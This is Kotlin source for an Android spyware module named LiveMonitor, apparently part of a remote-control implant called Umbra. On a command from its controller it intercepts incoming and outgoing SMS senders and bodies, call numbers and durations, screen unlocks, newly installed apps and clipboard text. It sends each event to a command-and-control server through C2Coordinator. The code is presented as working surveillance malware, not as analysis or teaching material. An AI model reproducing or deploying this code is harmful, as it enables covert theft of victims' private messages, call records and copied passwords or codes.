package org.umbra.core.modules

import android.content.BroadcastReceiver
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.database.ContentObserver
import android.net.Uri
import android.os.Binder
import android.os.Handler
import android.os.Looper
import android.provider.Telephony
import android.telephony.PhoneStateListener
import android.telephony.TelephonyManager
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import org.umbra.core.c2.C2Coordinator
import org.umbra.core.c2.Command
import org.umbra.core.core.ResponseEnvelope
import org.umbra.core.core.UmbraResponse

object LiveMonitor {
    private const val TAG = "Umbra.LiveMonitor"

    private val json = Json { ignoreUnknownKeys = true; encodeDefaults = false }

    private var appContext: Context? = null
    private var scope: CoroutineScope? = null

    // ── Monitor states ──────────────────────────────────────────────────

    private var smsMonitorActive = false
    private var callMonitorActive = false
    private var screenMonitorActive = false
    private var packageMonitorActive = false
    private var clipboardMonitorActive = false

    // ── Observer / listener handles ─────────────────────────────────────

    private var smsObserver: SmsContentObserver? = null
    private var phoneListener: UmbraPhoneListener? = null
    private var screenReceiver: ScreenUnlockReceiver? = null
    private var packageReceiver: PackageInstallReceiver? = null
    private var clipListener: ClipboardChangeListener? = null

    // ── Call state tracking ─────────────────────────────────────────────

    private var callStartTime: Long = 0L
    private var lastCallNumber: String = ""
    private var lastCallState: Int = TelephonyManager.CALL_STATE_IDLE

    // ═══════════════════════════════════════════════════════════════════
    //  COMMANDS
    // ═══════════════════════════════════════════════════════════════════

    fun start(ctx: Context, cmd: Command): UmbraResponse {
        appContext = ctx.applicationContext
        scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

        startSmsMonitor()
        startCallMonitor()
        startScreenMonitor()
        startPackageMonitor()
        startClipboardMonitor()

        Log.d(TAG, "All live monitors started")
        return UmbraResponse.LiveStatusResponse(
            status = "started",
            monitors = getActiveMonitors()
        )
    }

    fun stop(ctx: Context, cmd: Command): UmbraResponse {
        stopSmsMonitor()
        stopCallMonitor()
        stopScreenMonitor()
        stopPackageMonitor()
        stopClipboardMonitor()

        scope?.cancel()
        scope = null
        appContext = null

        Log.d(TAG, "All live monitors stopped")
        return UmbraResponse.LiveStatusResponse(
            status = "stopped",
            monitors = emptyMap()
        )
    }

    fun status(cmd: Command): UmbraResponse {
        val monitors = getActiveMonitors()
        val anyActive = monitors.values.any { it }
        return UmbraResponse.LiveStatusResponse(
            status = if (anyActive) "running" else "idle",
            monitors = monitors
        )
    }

    // ═══════════════════════════════════════════════════════════════════
    //  PUSH HELPER
    // ═══════════════════════════════════════════════════════════════════

    private fun push(response: UmbraResponse) {
        scope?.launch {
            try {
                val envelope = ResponseEnvelope(
                    type = response::class.simpleName ?: "LiveEventResponse",
                    device_id = "",
                    cmd_id = "live_push",
                    status = "ok",
                    payload = response
                )
                val serialized = json.encodeToString(ResponseEnvelope.serializer(), envelope)
                C2Coordinator.sendResult(serialized)
            } catch (e: Exception) {
                Log.e(TAG, "Push failed: ${e.message}", e)
            }
        }
    }

    private fun getActiveMonitors(): Map<String, Boolean> = mapOf(
        "sms" to smsMonitorActive,
        "call" to callMonitorActive,
        "screen" to screenMonitorActive,
        "package" to packageMonitorActive,
        "clipboard" to clipboardMonitorActive
    )

    // ═══════════════════════════════════════════════════════════════════
    //  SMS INTERCEPTOR
    // ═══════════════════════════════════════════════════════════════════

    private fun startSmsMonitor() {
        val ctx = appContext ?: return
        if (smsMonitorActive) return

        smsObserver = SmsContentObserver(Handler(Looper.getMainLooper()))
        try {
            // Observe incoming SMS
            ctx.contentResolver.registerContentObserver(
                Uri.parse("content://sms"), true, smsObserver!!
            )
            // Observe outgoing SMS
            ctx.contentResolver.registerContentObserver(
                Uri.parse("content://sms/sent"), true, smsObserver!!
            )
            smsMonitorActive = true
            Log.d(TAG, "SMS monitor active")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start SMS monitor: ${e.message}")
        }
    }

    private fun stopSmsMonitor() {
        val ctx = appContext ?: return
        smsObserver?.let { ctx.contentResolver.unregisterContentObserver(it) }
        smsObserver = null
        smsMonitorActive = false
        Log.d(TAG, "SMS monitor stopped")
    }

    private class SmsContentObserver(handler: Handler) : ContentObserver(handler) {
        override fun onChange(selfChange: Boolean, uri: Uri?) {
            super.onChange(selfChange, uri)
            val ctx = appContext ?: return
            try {
                val uriStr = uri?.toString() ?: ""
                val isIncoming = !uriStr.contains("sent")

                // Query the latest SMS
                val cursor = ctx.contentResolver.query(
                    Telephony.Sms.CONTENT_URI,
                    null, null, null, "date DESC LIMIT 1"
                )
                cursor?.use {
                    if (it.moveToFirst()) {
                        val idIdx = it.getColumnIndex("_id")
                        val addrIdx = it.getColumnIndex("address")
                        val bodyIdx = it.getColumnIndex("body")
                        val dateIdx = it.getColumnIndex("date")
                        val typeIdx = it.getColumnIndex("type")

                        val typeCode = if (typeIdx >= 0) it.getInt(typeIdx) else 1
                        val smsType = if (isIncoming) "inbox" else "sent"

                        val address = if (addrIdx >= 0) it.getString(addrIdx) ?: "" else ""
                        val body = if (bodyIdx >= 0) it.getString(bodyIdx) ?: "" else ""
                        val date = if (dateIdx >= 0) it.getLong(dateIdx) else 0L

                        if (address.isNotBlank()) {
                            push(UmbraResponse.LiveEventResponse(
                                event_type = if (isIncoming) "sms_received" else "sms_sent",
                                sms_address = address,
                                sms_body = body,
                                sms_date = date,
                                sms_type = smsType
                            ))
                            Log.d(TAG, "SMS pushed: ${smsType} from $address")
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "SMS observer error: ${e.message}")
            }
        }
    }

    // ═══════════════════════════════════════════════════════════════════
    //  CALL STATE MONITOR
    // ═══════════════════════════════════════════════════════════════════

    private fun startCallMonitor() {
        val ctx = appContext ?: return
        if (callMonitorActive) return

        try {
            val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            phoneListener = UmbraPhoneListener()
            tm.listen(phoneListener, PhoneStateListener.LISTEN_CALL_STATE)
            callMonitorActive = true
            Log.d(TAG, "Call monitor active")
        } catch (e: SecurityException) {
            Log.e(TAG, "Call monitor requires READ_PHONE_STATE permission")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start call monitor: ${e.message}")
        }
    }

    private fun stopCallMonitor() {
        val ctx = appContext ?: return
        try {
            val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            phoneListener?.let { tm.listen(it, PhoneStateListener.LISTEN_NONE) }
        } catch (_: Exception) {}
        phoneListener = null
        callMonitorActive = false
        Log.d(TAG, "Call monitor stopped")
    }

    private class UmbraPhoneListener : PhoneStateListener() {
        override fun onCallStateChanged(state: Int, phoneNumber: String?) {
            super.onCallStateChanged(state, phoneNumber)
            val number = phoneNumber ?: ""

            when (state) {
                TelephonyManager.CALL_STATE_RINGING -> {
                    lastCallNumber = number
                    lastCallState = state
                    push(UmbraResponse.LiveEventResponse(
                        event_type = "call_ringing",
                        call_number = number
                    ))
                    Log.d(TAG, "Call ringing: $number")
                }
                TelephonyManager.CALL_STATE_OFFHOOK -> {
                    lastCallNumber = if (lastCallNumber.isEmpty() && number.isNotEmpty()) number else lastCallNumber
                    callStartTime = System.currentTimeMillis()
                    lastCallState = state
                    push(UmbraResponse.LiveEventResponse(
                        event_type = "call_offhook",
                        call_number = lastCallNumber
                    ))
                    Log.d(TAG, "Call offhook: $lastCallNumber")
                }
                TelephonyManager.CALL_STATE_IDLE -> {
                    if (lastCallState != TelephonyManager.CALL_STATE_IDLE) {
                        val duration = if (callStartTime > 0) {
                            (System.currentTimeMillis() - callStartTime) / 1000
                        } else 0L
                        push(UmbraResponse.LiveEventResponse(
                            event_type = "call_idle",
                            call_number = lastCallNumber,
                            call_duration = duration
                        ))
                        Log.d(TAG, "Call ended: $lastCallNumber, duration=${duration}s")
                    }
                    callStartTime = 0L
                    lastCallNumber = ""
                    lastCallState = state
                }
            }
        }
    }

    // ═══════════════════════════════════════════════════════════════════
    //  SCREEN UNLOCK MONITOR
    // ═══════════════════════════════════════════════════════════════════

    private fun startScreenMonitor() {
        val ctx = appContext ?: return
        if (screenMonitorActive) return

        screenReceiver = ScreenUnlockReceiver()
        val filter = IntentFilter().apply {
            addAction(Intent.ACTION_USER_PRESENT)
            addAction(Intent.ACTION_SCREEN_ON)
        }
        ctx.registerReceiver(screenReceiver, filter)
        screenMonitorActive = true
        Log.d(TAG, "Screen monitor active")
    }

    private fun stopScreenMonitor() {
        val ctx = appContext ?: return
        screenReceiver?.let { ctx.unregisterReceiver(it) }
        screenReceiver = null
        screenMonitorActive = false
        Log.d(TAG, "Screen monitor stopped")
    }

    private class ScreenUnlockReceiver : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val action = intent?.action ?: return
            when (action) {
                Intent.ACTION_USER_PRESENT -> {
                    push(UmbraResponse.LiveEventResponse(
                        event_type = "user_present",
                        screen_action = "unlock"
                    ))
                    Log.d(TAG, "Screen unlocked")
                }
                Intent.ACTION_SCREEN_ON -> {
                    push(UmbraResponse.LiveEventResponse(
                        event_type = "screen_on",
                        screen_action = "on"
                    ))
                    Log.d(TAG, "Screen turned on")
                }
            }
        }
    }

    // ═══════════════════════════════════════════════════════════════════
    //  PACKAGE INSTALL MONITOR
    // ═══════════════════════════════════════════════════════════════════

    private fun startPackageMonitor() {
        val ctx = appContext ?: return
        if (packageMonitorActive) return

        packageReceiver = PackageInstallReceiver()
        val filter = IntentFilter().apply {
            addAction(Intent.ACTION_PACKAGE_ADDED)
            addDataScheme("package")
        }
        ctx.registerReceiver(packageReceiver, filter)
        packageMonitorActive = true
        Log.d(TAG, "Package monitor active")
    }

    private fun stopPackageMonitor() {
        val ctx = appContext ?: return
        packageReceiver?.let { ctx.unregisterReceiver(it) }
        packageReceiver = null
        packageMonitorActive = false
        Log.d(TAG, "Package monitor stopped")
    }

    private class PackageInstallReceiver : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val ctx = context ?: appContext ?: return
            val data = intent?.data ?: return
            val packageName = data.schemeSpecificPart ?: return

            // Don't report our own package
            if (packageName == ctx.packageName) return

            val appName = try {
                val pm = ctx.packageManager
                val appInfo = pm.getApplicationInfo(packageName, 0)
                pm.getApplicationLabel(appInfo).toString()
            } catch (e: PackageManager.NameNotFoundException) {
                packageName
            }

            push(UmbraResponse.LiveEventResponse(
                event_type = "package_added",
                package_name = packageName,
                app_name = appName
            ))
            Log.d(TAG, "Package installed: $packageName ($appName)")
        }
    }

    // ═══════════════════════════════════════════════════════════════════
    //  CLIPBOARD MONITOR
    // ═══════════════════════════════════════════════════════════════════

    private fun startClipboardMonitor() {
        val ctx = appContext ?: return
        if (clipboardMonitorActive) return

        clipListener = ClipboardChangeListener()
        val handler = Handler(Looper.getMainLooper())
        handler.post {
            try {
                val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                cm.addPrimaryClipChangedListener(clipListener!!)
                clipboardMonitorActive = true
                Log.d(TAG, "Clipboard monitor active")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start clipboard monitor: ${e.message}")
            }
        }
    }

    private fun stopClipboardMonitor() {
        val ctx = appContext ?: return
        val handler = Handler(Looper.getMainLooper())
        handler.post {
            try {
                val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                clipListener?.let { cm.removePrimaryClipChangedListener(it) }
            } catch (_: Exception) {}
        }
        clipListener = null
        clipboardMonitorActive = false
        Log.d(TAG, "Clipboard monitor stopped")
    }

    private class ClipboardChangeListener : ClipboardManager.OnPrimaryClipChangedListener {
        override fun onPrimaryClipChanged() {
            val ctx = appContext ?: return
            try {
                val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                val clip = cm.primaryClip ?: return
                if (clip.itemCount == 0) return

                val item = clip.getItemAt(0)
                val text = item.text?.toString()
                    ?: item.htmlText?.toString()
                    ?: item.uri?.toString()
                    ?: return

                val mimeType = clip.description.getMimeType(0) ?: "text/plain"

                // Truncate long clipboard content
                val maxLen = 2000
                val truncated = if (text.length > maxLen) text.take(maxLen) + "..." else text

                push(UmbraResponse.LiveEventResponse(
                    event_type = "clipboard_changed",
                    clipboard_text = truncated,
                    clipboard_mime = mimeType
                ))
                Log.d(TAG, "Clipboard changed: ${truncated.take(80)}")
            } catch (e: Exception) {
                Log.e(TAG, "Clipboard monitor error: ${e.message}")
            }
        }
    }
}
